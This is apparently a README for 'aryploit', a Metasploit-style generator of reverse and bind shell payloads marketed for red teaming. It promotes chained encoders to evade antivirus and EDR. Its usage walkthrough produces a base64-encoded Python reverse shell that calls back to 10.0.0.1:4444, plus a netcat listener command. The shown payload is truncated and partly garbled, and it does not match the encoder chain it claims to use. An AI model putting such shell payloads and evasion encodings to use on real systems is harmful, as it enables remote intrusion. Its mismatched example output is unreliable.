<div align="center">
  <h1>🔥 ARYPLOIT</h1>
  <p>
    <strong>Metasploit-style reverse/bind shell generator with advanced encoders for red teamers & pentesters</strong>
  </p>

</div>

---

## **🚀 What is ARYPLOIT?**
**aryploit** is a **Metasploit-inspired**, **all-in-one payload generator** for **reverse shells, bind shells, and advanced encoding**. Built for **red teamers, pentesters, and CTF players**, it simplifies payload generation with **10+ encoders**, **cross-platform support (Linux/Windows/Web)**, and **evasion techniques** to bypass AV/EDR.

⚠️ **For authorized testing & educational purposes only.**

---

## **🔥 Features**
✅ **100+ Payloads** – Reverse & bind shells for **Linux, Windows, PHP, ASP, JSP, PowerShell, Python, Ruby, Perl, and more**.
✅ **Advanced Encoders** – Chain **Base64, URL, Hex, ROT13, XOR, Caesar, Binary, Octal, HTML, Unicode** for evasion.
✅ **Search & Filter** – Quickly find payloads with `search payload linux` or `search encoders base64`.
✅ **Listener Examples** – Auto-generate **Netcat, Socat, Python** listener commands.
✅ **Modular & Extensible** – Easy to add **custom payloads, encoders, and listeners**.
✅ **CTF & Red Team Ready** – Designed for **real-world engagements** and **capture-the-flag challenges**.

---

## **📌 Installation**
### **From GitHub (Recommended)**
```bash
git clone https://github.com/giriaryan694-a11y/aryploi.git
cd aryploit


pip3 install -r requirements.txt
python3 aryploit.py

1. List Payloads
 Copyaryploit > list rev_payloads linux
reverse/linux/bash_tcp
reverse/linux/python
reverse/linux/perl
...
Filter by keyword:
 Copyaryploit > search payload tcp
reverse/linux/bash_tcp
reverse/windows/powershell
...
2. Select a Payload
 Copyaryploit > use reverse/linux/bash_tcp
[+] Loaded payload: reverse/linux/bash_tcp
Or use set payload:
 Copyaryploit > set payload reverse/linux/bash_tcp
3. Set LHOST & LPORT
 Copyaryploit > set lhost 10.0.0.1
aryploit > set lport 4444
4. Apply Encoders (Single or Chained)
 Copyaryploit > set encoder base64,url,hex
[+] Encoder chain set: base64, url, hex
5. Generate Payload
 Copyaryploit > generate
[+] Generated Payload:
aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSk7b3MuZHVwMjoocy5maWxlbm8oKSwMCk9TKSwgb3MuZHVwMjoo...
6. Start a Listener
 Copyaryploit > listener nc
[+] Listener Example (nc): nc -lvnp 4444
